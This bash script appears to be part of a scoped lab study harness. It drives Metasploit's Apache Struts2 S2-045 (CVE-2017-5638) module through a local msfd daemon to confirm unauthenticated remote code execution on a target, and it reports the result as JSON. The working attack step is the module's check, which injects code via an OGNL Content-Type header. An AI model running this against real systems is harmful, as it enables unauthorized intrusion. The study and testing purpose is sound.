#!/usr/bin/env bash
# Pre-staged primitive: Apache Struts2 S2-045 / CVE-2017-5638 RCE (genuine http-struts).
#
# STANDARD TOOLING ONLY — this primitive DRIVES the established, maintained Metasploit
# module ``exploit/multi/http/struts2_content_type_ognl``; no exploit is authored here. The
# module's ``check`` sends the public S2-045 Content-Type OGNL vector that executes
# attacker-controlled code on the target (``@java.lang.System@getProperty('os.name')``) and
# reflects the result in a response header — i.e. it CONFIRMS unauthenticated RCE by
# observing injected COMMAND OUTPUT, which the study defines as obj_b for Struts.
# Prints EXACTLY ONE JSON line the courier parses:
#     {"reached_and_executed": <bool>, "unauthorized_access": <bool>}
#
# reached_and_executed = the Struts endpoint answered and the module ran the vector.
# unauthorized_access  = the module confirmed the injected code executed (RCE).
#
# RESIDENT METASPLOIT (2026-10-31). The module runs in the resident Metasploit daemon
# (``msfd``, a service on this node, loopback only: infra/ansible/roles/attacker/files/
# msfd.service), which loaded the framework once. Started fresh for each delivery, msfconsole
# made the delivery take about 14 s, mostly before anything was sent, and exploits are scored
# when they complete (decision A1), so that overhead decided whether a reconfiguration
# overtook the exploit. The console commands reach msfd over one TCP connection from bash,
# followed by ``version`` as a sentinel and ``exit -y``, which ends that console and makes msfd
# close the connection. The primitive prints NO verdict and exits 3 when msfd cannot be
# reached, sends no line for ``MSFD_TIMEOUT_S`` seconds, or closes before the sentinel (msfd
# dying or restarting mid-delivery), and when the console shows no check result at all: the
# courier records an infrastructure fault, never a failed exploit.
#
# THE PAYLOAD IS SET BEFORE ``use`` (2026-11-01). Given no payload, ``use`` picks a default by
# instantiating every payload the module could take (its target spans Unix, Windows and Linux,
# CMD, x86 and x64), and the first live staging measured 6.2-6.3 s per delivery against about
# 2 s for vsftpd, whose module accepts few. ``check`` uses no payload, so the console sets a
# global ``PAYLOAD`` (``cmd/unix/generic``, one the module accepts) for ``use`` to take as
# configured, then unsets it, leaving no state in the daemon.
#
# Usage: struts_s2_045.sh <host> <port> <path>   (scoped to 172.31.66.0/24)
set -uo pipefail

HOST="${1:?host}"; PORT="${2:?port}"; PATH_="${3:-/}"
MSFD_HOST="${MSFD_HOST:-127.0.0.1}"; MSFD_PORT="${MSFD_PORT:-55554}"
MSFD_TIMEOUT_S="${MSFD_TIMEOUT_S:-90}"

emit() { printf '{"reached_and_executed": %s, "unauthorized_access": %s}\n' "$1" "$2"; }

# Run console commands (one per line) in a new msfd console, then ``version`` as a sentinel, and
# print what the console printed. Non-zero when msfd cannot be reached (3), sends no line for
# MSFD_TIMEOUT_S seconds (124), or closes before answering the sentinel (5, or 141 when it closes
# while the commands are still being sent: SIGPIPE). Bash only (``read -t``), so it needs no
# GNU ``timeout``, and it reads a timeout the same way in bash 3.2 (macOS's /bin/bash, where a
# read that times out returns 1, as at the end of input) and in bash 4 and later (above 128).
msfd_run() {
  local out="" line rc t0
  exec 3<>"/dev/tcp/${MSFD_HOST}/${MSFD_PORT}" || return 3
  printf '%s\nversion\nexit -y\n' "$1" >&3
  while :; do
    line=""
    t0=$SECONDS
    IFS= read -r -t "$MSFD_TIMEOUT_S" line <&3
    rc=$?
    if [ "$rc" -ne 0 ]; then
      out="${out}${line}"  # the last prompt has no newline; msfd closes after ``exit -y``
      break
    fi
    out="${out}${line}
"
  done
  exec 3<&- 3>&-
  if [ "$rc" -gt 128 ] || [ $((SECONDS - t0)) -ge "$MSFD_TIMEOUT_S" ]; then return 124; fi
  case "$out" in *"Framework:"*) ;; *) return 5 ;; esac
  printf '%s\n' "$out"
}

no_verdict() {
  echo "struts_s2_045: $1 (no verdict)" >&2
  exit 3
}

# 1. Reach: does the Struts app answer at this endpoint at all (any HTTP status counts)?
if ! curl -s -m 15 -o /dev/null "http://${HOST}:${PORT}${PATH_}"; then emit false false; exit 0; fi

# 2. Drive the maintained module's check (runs the OGNL vector, reflects command output).
OUT="$(msfd_run "setg PAYLOAD cmd/unix/generic
use exploit/multi/http/struts2_content_type_ognl
unsetg PAYLOAD
set RHOSTS ${HOST}
set RPORT ${PORT}
set SSL false
set TARGETURI ${PATH_}
check")" || no_verdict "msfd at ${MSFD_HOST}:${MSFD_PORT} did not answer (rc=$?)"

# Every check result prints one of these (Metasploit's CheckCode messages, or a failed check).
if ! grep -qiE "The target |Cannot reliably check|The service is running|does not support check|Check failed" <<<"$OUT"; then
  no_verdict "msfd ran no check"
fi
# CheckCode::Vulnerable prints "The target is vulnerable. Successfully executed the injected code".
if grep -qiE "Successfully executed the injected code|The target is vulnerable" <<<"$OUT"; then
  emit true true
else
  emit true false   # reached + module ran, but RCE not confirmed
fi
